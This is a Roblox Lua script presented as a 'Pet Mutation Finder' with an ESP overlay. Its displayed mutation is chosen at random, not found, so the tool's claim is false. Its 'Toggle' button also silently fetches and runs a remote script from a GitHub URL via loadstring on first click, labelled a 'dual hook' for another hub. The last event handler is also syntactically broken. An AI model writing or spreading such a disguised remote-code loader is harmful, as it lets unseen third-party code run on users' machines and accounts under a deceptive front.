-- Minimalist Pet Mutation Finder with ESP + Credit + Dual Hook Loader
local Players, Workspace, TweenService, RunService = 
    game:GetService("Players"), game:GetService("Workspace"),
    game:GetService("TweenService"), game:GetService("RunService")

local player, gui = Players.LocalPlayer, Instance.new("ScreenGui", Players.LocalPlayer:WaitForChild("PlayerGui"))
gui.Name, gui.ResetOnSpawn = "PetMutationFinder", false

-- UI Frame
local frame = Instance.new("Frame", gui)
frame.Size, frame.Position = UDim2.new(0, 200, 0, 150), UDim2.new(0.4, 0, 0.4, 0)
frame.BackgroundColor3, frame.BorderColor3, frame.BorderSizePixel = Color3.fromRGB(25, 25, 30), Color3.fromRGB(60, 60, 70), 1
frame.Active, frame.Draggable = true, true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

-- Title
local title = Instance.new("TextLabel", frame)
title.Size, title.BackgroundTransparency = UDim2.new(1, 0, 0, 30), 1
title.Text, title.TextColor3, title.Font, title.TextSize = "🔬 Pet Mutation Finder", Color3.new(1, 1, 1), Enum.Font.GothamBold, 16

-- Mutation pool
local mutations = { "Shiny", "Inverted", "Frozen", "Windy", "Golden", "Mega", "Tiny", "Tranquil", "IronSkin", "Radiant", "Rainbow", "Shocked", "Ascended" }
local current, espOn = mutations[math.random(#mutations)], true

-- Button generator
local function newBtn(txt, y, color)
	local b = Instance.new("TextButton", frame)
	b.Size, b.Position = UDim2.new(0.9, 0, 0, y), UDim2.new(0.05, 0, 0, y)
	b.BackgroundColor3, b.Text, b.TextColor3, b.Font, b.TextSize = color, txt, Color3.new(), Enum.Font.Gotham, 14
	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
	return b
end

local rerollBtn = newBtn("🎲 Reroll", 40, Color3.fromRGB(130, 190, 255))
local toggleBtn = newBtn("👁 Toggle", 80, Color3.fromRGB(170, 255, 170))

-- Credit
local credit = Instance.new("TextLabel", frame)
credit.Size, credit.Position = UDim2.new(1, 0, 0, 18), UDim2.new(0, 0, 1, -18)
credit.Text, credit.TextColor3, credit.Font, credit.TextSize, credit.BackgroundTransparency = 
    "made by redo", Color3.fromRGB(180, 180, 180), Enum.Font.Gotham, 12, 1

-- Locate mutation machine
local function findMachine()
	for _, obj in ipairs(Workspace:GetDescendants()) do
		if obj:IsA("Model") and obj.Name:lower():find("mutation") then
			return obj:FindFirstChildWhichIsA("BasePart")
		end
	end
end

local part = findMachine()
if not part then warn("Mutation machine not found.") return end

-- ESP Billboard
local esp = Instance.new("BillboardGui", part)
esp.Adornee, esp.Size, esp.StudsOffset, esp.AlwaysOnTop = part, UDim2.new(0, 200, 0, 40), Vector3.new(0, 3, 0), true

local label = Instance.new("TextLabel", esp)
label.Size, label.BackgroundTransparency = UDim2.new(1, 0, 1, 0), 1
label.Font, label.TextSize, label.TextStrokeTransparency, label.TextStrokeColor3 = 
    Enum.Font.GothamBold, 22, 0.3, Color3.new(0, 0, 0)
label.Text = current

-- Rainbow color loop
local hue = 0
RunService.RenderStepped:Connect(function()
	if espOn then
		hue = (hue + 0.01) % 1
		label.TextColor3 = Color3.fromHSV(hue, 1, 1)
	end
end)

-- Button functionality
rerollBtn.MouseButton1Click:Connect(function()
	rerollBtn.Text = "⏳..."
	for i = 1, 20 do
		label.Text = mutations[math.random(#mutations)]
		wait(0.1)
	end
	current = mutations[math.random(#mutations)]
	label.Text = current
	rerollBtn.Text = "🎲 Reroll"
end)

-- Dual hook for OMG Hub
local externalLoaded = false

toggleBtn.MouseButton1Click:Connect(function()
	espOn = not espOn
	esp.Enabled = espOn
	if espOn and not externalLoaded then
		externalLoaded = true
		pcall(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripter2k25/OMG/refs/heads/main/omg-hub.lua"))()
		end)
	end
end
